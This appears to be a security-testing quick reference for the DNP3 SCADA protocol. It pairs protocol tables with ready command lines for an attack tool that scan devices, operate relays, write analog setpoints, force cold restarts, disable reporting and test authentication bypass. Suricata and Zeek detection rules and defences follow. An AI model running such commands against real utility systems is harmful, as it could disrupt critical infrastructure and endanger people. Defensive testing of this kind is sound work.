# DNP3 Protocol Quick Reference

## Protocol Overview
- **Protocol**: Distributed Network Protocol 3 (DNP3)
- **Port**: TCP/20000, Serial RS-232/RS-485
- **OSI Layer**: Application Layer
- **Specification**: IEEE 1815-2012
- **Primary Use**: Electric utility SCADA, substations, RTUs

## Attack Tool Reference
**Implementation**: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py` (DNP3 module)
**Version**: 3.0
**Testing Guide**: `tools/modbus-stealth-toolkit/TESTING.md`

## Function Codes
| Code | Function | Direction | MITRE |
|------|----------|-----------|-------|
| 0x01 | Read | Master->Outstation | T0801, T0861 |
| 0x02 | Write | Master->Outstation | T0855, T0836 |
| 0x03 | Select | Master->Outstation | T0855 |
| 0x04 | Operate | Master->Outstation | T0855, T0836 |
| 0x05 | Direct Operate | Master->Outstation | T0855, T0836 |
| 0x06 | Direct Operate No Ack | Master->Outstation | T0855 |
| 0x0D | Cold Restart | Master->Outstation | T0858, T0809 |
| 0x0E | Warm Restart | Master->Outstation | T0858 |
| 0x14 | Enable Unsolicited | Master->Outstation | T0804 |
| 0x15 | Disable Unsolicited | Master->Outstation | T0804 |
| 0x81 | Response | Outstation->Master | - |
| 0x82 | Unsolicited Response | Outstation->Master | T0856 |

## Object Groups

### Binary Input (Status)
| Group | Variation | Description | Size |
|-------|-----------|-------------|------|
| 1 | 0 | Any variation | Variable |
| 1 | 1 | Single-bit packed | 1 bit |
| 1 | 2 | With status | 1 byte |
| 2 | 0 | Binary input events | Variable |
| 2 | 1 | Without time | 1 byte |
| 2 | 2 | With absolute time | 7 bytes |
| 2 | 3 | With relative time | 3 bytes |

### Binary Output (Control)
| Group | Variation | Description | MITRE |
|-------|-----------|-------------|-------|
| 10 | 0 | Any variation | - |
| 10 | 1 | Packed format | - |
| 10 | 2 | With status | - |
| 12 | 1 | CROB (Control Relay Output Block) | T0855, T0836 |

### Analog Input
| Group | Variation | Description | Size |
|-------|-----------|-------------|------|
| 30 | 0 | Any variation | Variable |
| 30 | 1 | 32-bit with flag | 5 bytes |
| 30 | 2 | 16-bit with flag | 3 bytes |
| 30 | 3 | 32-bit without flag | 4 bytes |
| 30 | 4 | 16-bit without flag | 2 bytes |
| 30 | 5 | Single-precision float | 5 bytes |
| 30 | 6 | Double-precision float | 9 bytes |

### Analog Output
| Group | Variation | Description | MITRE |
|-------|-----------|-------------|-------|
| 40 | 0 | Any variation | - |
| 40 | 1 | 32-bit with status | T0855 |
| 40 | 2 | 16-bit with status | T0855 |
| 40 | 3 | Single-precision float | T0855 |
| 40 | 4 | Double-precision float | T0855 |

### Special Groups
| Group | Description | Purpose | MITRE |
|-------|-------------|---------|-------|
| 50 | Time and Date | Time synchronization | - |
| 60 | Class 0 Data | All static data | T0802 |
| 60 | Class 1 Data | High-priority events | T0802 |
| 60 | Class 2 Data | Medium-priority events | T0802 |
| 60 | Class 3 Data | Low-priority events | T0802 |
| 80 | Internal Indications | Device status flags | T0801, T0868 |

## Packet Structure

### DNP3 Frame Structure
```
Data Link Layer (10 bytes header):
  Start: 2 bytes (0x05 0x64)
  Length: 1 byte (frame length)
  Control: 1 byte (DIR, PRM, FCB/DFC, FCV/FCV, Function)
  Destination: 2 bytes (destination address)
  Source: 2 bytes (source address)
  CRC: 2 bytes (header CRC-16)

Data Block (max 250 bytes):
  User Data: up to 16 bytes per block
  CRC: 2 bytes per 16-byte block

Application Layer:
  Application Control: 1 byte (FIR, FIN, CON, UNS, SEQ)
  Function Code: 1 byte
  Object Data: variable (Group, Variation, Qualifier, Range, Data)
```

### Control Relay Output Block (CROB)
```
CROB Structure (11 bytes):
  Control Code: 1 byte
    - Bits 0-3: Operation type (NUL, PULSE_ON, PULSE_OFF, LATCH_ON, LATCH_OFF)
    - Bit 4: Queue (0=Execute immediately, 1=Queue)
    - Bit 5: Clear (0=No clear, 1=Clear queue)
    - Bits 6-7: Trip-Close Code
  Count: 1 byte (pulse count)
  On Time: 4 bytes (milliseconds)
  Off Time: 4 bytes (milliseconds)
  Status: 1 byte (response only)
```

## Attack Methods

### 1. Device Reconnaissance
```bash
# DNP3 device discovery and fingerprinting
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --mode scan

# Read device attributes (Internal Indications - Group 80)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --read-group 80
```
**MITRE**: T0888 (Remote System Discovery), T0801 (Monitor Process State), T0868 (Detect Operating Mode)

### 2. Data Collection
```bash
# Read all static data (Class 0)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --read-class 0

# Read binary inputs (Group 1)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --read-group 1 --variation 2 --range 0-100

# Read analog inputs (Group 30)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --read-group 30 --variation 1 --range 0-50
```
**MITRE**: T0801 (Monitor Process State), T0802 (Automated Collection), T0861 (Point & Tag Identification)

### 3. Control Commands (CROB)
```bash
# Direct Operate - Latch relay ON (no Select before Operate)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 \
  --dnp3-operate --crob-code 0x41 --crob-count 1 --crob-on-time 1000 --crob-off-time 1000 --point 5

# Pulse output (PULSE_ON)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 \
  --dnp3-operate --crob-code 0x01 --crob-count 1 --crob-on-time 500 --crob-off-time 0 --point 10
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)

### 4. Analog Output Manipulation
```bash
# Write analog output (Group 40)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 \
  --write-group 40 --variation 1 --point 15 --value 5000
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)

### 5. Device Control
```bash
# Cold restart (complete device reboot)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --cold-restart

# Warm restart (reload configuration)
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --warm-restart

# Disable unsolicited responses
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --disable-unsolicited
```
**MITRE**: T0858 (Change Operating Mode), T0809 (Data Destruction), T0804 (Block Reporting Message)

### 6. Secure Authentication Bypass
```bash
# Test DNP3 Secure Authentication (SAv5) bypass
python3 modbus_stealth_attack.py --protocol dnp3 --target 192.168.1.10 --dnp3-src 1 --dnp3-dst 10 --test-auth-bypass
```
**MITRE**: T0849 (Exploit Public-Facing Application), T0859 (Valid Accounts)

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/ics_malware_detection.rules`

```
# DNP3 unauthorized write operations (FC 0x02, 0x04, 0x05, 0x06)
alert tcp any any -> any 20000 (msg:"ICS: DNP3 Unauthorized Write Command"; \
    content:"|05 64|"; offset:0; depth:2; \
    pcre:"/\x05\x64.{8}[\x02\x04\x05\x06]/s"; \
    reference:url,attack.mitre.org/techniques/T0855; \
    classtype:industrial-protocol; sid:400003; rev:1;)

# DNP3 cold restart command (FC 0x0D)
alert tcp any any -> any 20000 (msg:"ICS: DNP3 Cold Restart Command"; \
    content:"|05 64|"; offset:0; depth:2; content:"|0D|"; distance:10; within:10; \
    reference:url,attack.mitre.org/techniques/T0858; \
    classtype:industrial-protocol; sid:400004; rev:1;)

# DNP3 authentication bypass attempt
alert tcp any any -> any 20000 (msg:"ICS: DNP3 Authentication Bypass Attempt"; \
    content:"|05 64|"; offset:0; depth:2; \
    threshold: type threshold, track by_src, count 5, seconds 30; \
    classtype:industrial-protocol; sid:400005; rev:1;)
```

### Zeek Detection
**File**: `configs/zeek/ics_detection.zeek`

```zeek
module DNP3_Monitor;

export {
    redef enum Log::ID += { LOG };
    
    type Info: record {
        ts: time &log;
        uid: string &log;
        id: conn_id &log;
        fc: count &log;
        operation: string &log;
        severity: string &log;
        details: string &log;
    };
}

# DNP3 write detection (FC 0x02, 0x04, 0x05)
event dnp3_application_request_header(c: connection, is_orig: bool, 
                                       fc: count, iin: count) {
    if (fc == 0x02 || fc == 0x04 || fc == 0x05) {
        local severity = "HIGH";
        local operation = "";
        
        if (fc == 0x02) operation = "WRITE";
        else if (fc == 0x04) operation = "OPERATE";
        else if (fc == 0x05) operation = "DIRECT_OPERATE";
        
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $fc=fc, $operation=operation, $severity=severity,
            $details=fmt("DNP3 write operation detected")]);
    }
}

# DNP3 cold restart detection (FC 0x0D)
event dnp3_control_request(c: connection, fc: count) {
    if (fc == 0x0D) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $fc=fc, $operation="COLD_RESTART", $severity="CRITICAL",
            $details="DNP3 cold restart command"]);
    }
}

# DNP3 request rate monitoring
global dnp3_request_count: table[addr] of count &create_expire=30sec;

event dnp3_application_request_header(c: connection, is_orig: bool, 
                                       fc: count, iin: count) {
    if (c$id$orig_h !in dnp3_request_count) {
        dnp3_request_count[c$id$orig_h] = 0;
    }
    dnp3_request_count[c$id$orig_h] += 1;
    
    if (dnp3_request_count[c$id$orig_h] >= 20) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $fc=0, $operation="HIGH_RATE_REQUESTS", $severity="HIGH",
            $details=fmt("DNP3 request storm: %d requests in 30s", 
                        dnp3_request_count[c$id$orig_h])]);
    }
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: Device attribute reads, Internal Indications (Group 80)
- **T0801**: Monitor Process State
  - Methods: Class 0 reads, binary/analog input reads
- **T0868**: Detect Operating Mode
  - Methods: Internal Indications queries

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: Class data reads (Groups 60-62), periodic polling
- **T0861**: Point & Tag Identification
  - Methods: Object enumeration, point mapping

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: CROB commands, analog output writes

### Impact (Tactic: TA0105)
- **T0855**: Unauthorized Command Message
  - Methods: Direct Operate (FC 0x05), Write (FC 0x02), CROB
- **T0836**: Modify Parameter
  - Methods: Analog output writes, setpoint changes
- **T0858**: Change Operating Mode
  - Methods: Cold Restart (FC 0x0D), Warm Restart (FC 0x0E)
- **T0809**: Data Destruction
  - Methods: Cold Restart
- **T0856**: Spoof Reporting Message
  - Methods: Unsolicited response injection
- **T0804**: Block Reporting Message
  - Methods: Disable Unsolicited (FC 0x15)

## Common Vulnerabilities

### Weak Authentication (Pre-SAv5)
- **Issue**: Original DNP3 had no authentication
- **Impact**: Command spoofing, unauthorized control
- **Mitigation**: Upgrade to DNP3 SAv5 (IEEE 1815-2012)

### Cleartext Communication
- **Issue**: All traffic sent unencrypted
- **Impact**: Traffic analysis, replay attacks
- **Mitigation**: TLS wrapper, VPN tunnels, DNP3 SAv5

### Broadcast/Unsolicited Manipulation
- **Issue**: Unsolicited responses can be forged
- **Impact**: False data injection, alarm manipulation
- **Mitigation**: Sequence number validation, source verification

### CROB Replay
- **Issue**: Control commands can be captured and replayed
- **Impact**: Unauthorized relay operations
- **Mitigation**: DNP3 SAv5 with challenge-response

### Class Data Polling
- **Issue**: Excessive Class 0 reads reveal all data
- **Impact**: Complete process visibility
- **Mitigation**: Rate limiting, access control

## Defense Recommendations

### Network Layer
1. **Segmentation**: Isolate DNP3 networks from corporate IT
2. **Firewall Rules**: Restrict TCP/20000 to authorized masters only
3. **IDS/IPS**: Deploy Suricata rules for DNP3 monitoring
4. **Network Monitoring**: Zeek scripts for protocol analysis

### Protocol Layer
1. **DNP3 SAv5**: Implement Secure Authentication version 5
2. **TLS Encryption**: Use DNP3 over TLS where supported
3. **Sequence Validation**: Enable sequence number checking
4. **Unsolicited Control**: Disable if not required

### Device Configuration
1. **Function Code Restrictions**: Limit allowed function codes
2. **Object Access Control**: Restrict write access to critical objects
3. **Rate Limiting**: Implement request rate limits
4. **Audit Logging**: Log all DNP3 transactions

### Operational
1. **Baseline Traffic**: Establish normal DNP3 communication patterns
2. **Change Management**: Document all configuration changes
3. **Point Mapping**: Maintain database of all DNP3 points
4. **Incident Response**: Define procedures for anomalous DNP3 activity

## Protocol Limits
- **Max Frame Size**: 292 bytes (250 user data + 42 overhead)
- **Max User Data per Block**: 16 bytes (followed by 2-byte CRC)
- **Max Application Fragment**: 2048 bytes (reassembled from frames)
- **Address Range**: 0-65519 (65520-65535 reserved)
- **Max Points per Request**: Limited by fragment size

## DNP3 Secure Authentication (SAv5)

### Security Features
- **Challenge-Response**: Prevents replay attacks
- **HMAC-SHA256**: Message authentication
- **Session Keys**: Encrypted with asymmetric crypto
- **User Authentication**: Role-based access control

### Authentication Objects
| Group | Description | Purpose |
|-------|-------------|---------|
| 120 | Authentication Challenge | Challenge generation |
| 121 | Authentication Reply | Challenge response |
| 122 | Authentication Aggressive Mode | Optimized auth |
| 123 | Authentication Error | Auth failure notification |

## Testing Checklist

### Reconnaissance Testing
- [ ] Device discovery and enumeration
- [ ] Internal Indications read (Group 80)
- [ ] Class 0 data poll (all static data)
- [ ] Point address mapping
- [ ] Authentication status check

### Read Testing
- [ ] Binary input reads (Group 1)
- [ ] Analog input reads (Group 30)
- [ ] Class 1/2/3 event data reads
- [ ] Object variation enumeration
- [ ] Time synchronization queries

### Write Testing
- [ ] CROB Direct Operate (FC 0x05)
- [ ] CROB Select-Before-Operate (FC 0x03, 0x04)
- [ ] Analog output writes (Group 40)
- [ ] Write command (FC 0x02)
- [ ] Latch/Pulse/Trip-Close operations

### Control Testing
- [ ] Cold restart command (FC 0x0D)
- [ ] Warm restart command (FC 0x0E)
- [ ] Enable/Disable unsolicited (FC 0x14/0x15)
- [ ] Time synchronization (Group 50)
- [ ] Device reset

### Security Testing
- [ ] DNP3 SAv5 authentication testing
- [ ] Replay attack validation
- [ ] Unsolicited response spoofing
- [ ] Sequence number manipulation
- [ ] Challenge-response bypass attempts

### Detection Validation
- [ ] Suricata rule triggering
- [ ] Zeek log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- IEEE 1815-2012 (DNP3 Specification)
- DNP3 Technical Bulletins (www.dnp.org)
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
- Detection Rules: `configs/suricata_rules/ics_malware_detection.rules`
- Zeek Monitor: `configs/zeek/ics_detection.zeek`
- Testing Guide: `tools/modbus-stealth-toolkit/TESTING.md`
